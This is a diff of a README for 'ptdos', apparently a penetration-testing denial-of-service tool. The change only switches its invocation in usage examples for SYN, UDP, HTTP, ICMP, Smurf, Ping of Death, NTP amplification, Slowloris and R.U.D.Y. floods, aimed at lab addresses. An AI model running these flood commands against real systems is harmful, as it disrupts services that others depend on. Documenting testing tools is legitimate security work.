@@ -84,47 +84,47 @@ source ~/.zshhrc
 ### Usage examples
 **SYN Flood**
 ```
-$ sudo python3 ptdos.py -a synflood -dst 192.168.0.80 -dp 80 -d 10 -ss
+$ sudo ptdos -a synflood -dst 192.168.0.80 -dp 80 -d 10 -ss
 ```
 **UDP Flood**
 ```
-$ python3 ptdos.py -a udpflood -dst 192.168.0.80 -dp 80 -dl 128 -d 4 -st 0.001
+$ ptdos -a udpflood -dst 192.168.0.80 -dp 80 -dl 128 -d 4 -st 0.001
 ```
 **HTTP GET Flood**
 ```
-$ python3 ptdos.py -a httpgetflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
+$ ptdos -a httpgetflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
 ```
 **HTTP POST Flood**
 ```
-$ python3 ptdos.py -a httppostflood -d 5 -dst "http://ptsv2.com/path/example" -body "{'name':'test','age':20}" -qs "par1=val1&par2=val2" -st 0.001
+$ ptdos -a httppostflood -d 5 -dst "http://ptsv2.com/path/example" -body "{'name':'test','age':20}" -qs "par1=val1&par2=val2" -st 0.001
 ```
 **HTTP HEAD Flood**
 ```
-$ python3 ptdos.py -a httpheadflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
+$ ptdos -a httpheadflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
 ```
 **ICMP Flood**
 ```
-$ sudo python3 ptdos.py -a icmpflood -dst 192.168.0.213 -d 4 --data-length 2048 -st 0.001
+$ sudo ptdos -a icmpflood -dst 192.168.0.213 -d 4 --data-length 2048 -st 0.001
 ```
 **Smurf Attack**
 ```
-$ sudo python3 ptdos.py -a smurf -d 10 -dst 192.168.0.80 -bc 192.168.0.255
+$ sudo ptdos -a smurf -d 10 -dst 192.168.0.80 -bc 192.168.0.255
 ```
 **Ping of Death**
 ```
-$ sudo python3 ptdos.py -a pingofdeath -d 5 -dst 192.168.0.80
+$ sudo ptdos -a pingofdeath -d 5 -dst 192.168.0.80
 ```
 **NTP Amplification**
 ```
-$ sudo python3 ptdos.py -a ntpampl -dst 192.168.0.80 -d 5
+$ sudo ptdos -a ntpampl -dst 192.168.0.80 -d 5
 ```
 **Slowloris**
 ```
-$ python3 ptdos.py -a slowloris -d 5 -dst "http://192.168.0.80" -dp 80 -sq 10 -st 5
+$ ptdos -a slowloris -d 5 -dst "http://192.168.0.80" -dp 80 -sq 10 -st 5
 ```
 **R.U.D.Y. - Are You Dead Yet?**
 ```
-$ python3 ptdos.py -a rudy -dst "http://192.168.0.80" -dp 80 -d 5 -st 10
+$ ptdos -a rudy -dst "http://192.168.0.80" -dp 80 -d 5 -st 10
 ```
 
 ### Options
